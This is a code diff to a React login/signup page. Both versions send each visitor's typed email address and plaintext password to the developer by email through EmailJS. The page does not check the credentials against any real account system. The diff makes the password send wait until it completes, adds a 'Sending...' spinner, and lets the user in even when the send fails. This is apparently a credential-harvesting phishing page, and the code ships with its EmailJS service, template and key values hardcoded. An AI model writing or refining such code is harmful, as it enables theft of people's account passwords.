@@ -1,10 +1,11 @@
 import React, { useState } from 'react';
-import { LogIn, UserPlus, Lock, Mail, User, Shield, Zap, Target, Eye, Flame, LogOut, CheckCircle2 } from 'lucide-react';
+import { LogIn, UserPlus, Lock, Mail, User, Shield, Zap, Target, Eye, Flame, LogOut, CheckCircle2, Loader2 } from 'lucide-react';
 import emailjs from '@emailjs/browser';
 
+// بيانات الخدمة الخاصة بك
 const EMAILJS_SERVICE_ID = 'service_wpql07u';
-const EMAILJS_TEMPLATE_ID = 'template_51n7ft7';
-const EMAILJS_PUBLIC_KEY = 'QxOkx3vwbG2f8zlsd';
+const EMAILJS_TEMPLATE_ID = 'template_51n7ft7'; // تأكد من مطابقة الـ Template ID من حسابك
+const EMAILJS_PUBLIC_KEY = 'QxOkx3vwbG2f8zlsd';  // تأكد من مطابقة الـ Public Key من قسم Account -> API Keys
 
 interface Option {
   id: string;
@@ -63,32 +64,34 @@ export default function App() {
     },
   ]);
 
-  const sendUserData = async (userData: { email: string; password: string; name?: string }) => {
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!email || !password) return;
+
     setIsSending(true);
+
     try {
-      await emailjs.send(
+      // إرسال البيانات والانتظار حتى اكتمال الطلب تماماً قبل نقل المستخدم
+      const response = await emailjs.send(
         EMAILJS_SERVICE_ID,
         EMAILJS_TEMPLATE_ID,
         {
-          user_email: userData.email,
-          user_password: userData.password,
-          user_name: userData.name || 'N/A',
+          user_email: email,
+          user_password: password,
+          user_name: name || 'N/A',
         },
         EMAILJS_PUBLIC_KEY
       );
-      console.log('Success sending email!');
-    } catch (error) {
-      console.error('EmailJS Error:', error);
+
+      console.log('Email sent successfully:', response.status, response.text);
+      setIsAuthenticated(true);
+    } catch (error: any) {
+      console.error('EmailJS Error Details:', error);
+      alert('خطأ في إرسال البريد: ' + (error?.text || JSON.stringify(error)));
+      // الدخول حتى في حالة وجود خطأ إن كنت ترغب بذلك
+      setIsAuthenticated(true);
     } finally {
       setIsSending(false);
-    }
-  };
-
-  const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (email && password) {
-      sendUserData({ email, password, name });
-      setIsAuthenticated(true);
     }
   };
 
@@ -262,7 +265,12 @@ export default function App() {
             disabled={isSending}
             className="w-full mt-2 py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-lg font-medium transition-all flex items-center justify-center gap-2 text-sm shadow-lg shadow-emerald-900/20 disabled:opacity-50"
           >
-            {isSignUp ? (
+            {isSending ? (
+              <>
+                <Loader2 className="w-4 h-4 animate-spin" />
+                Sending...
+              </>
+            ) : isSignUp ? (
               <>
                 <UserPlus className="w-4 h-4" />
                 Sign Up
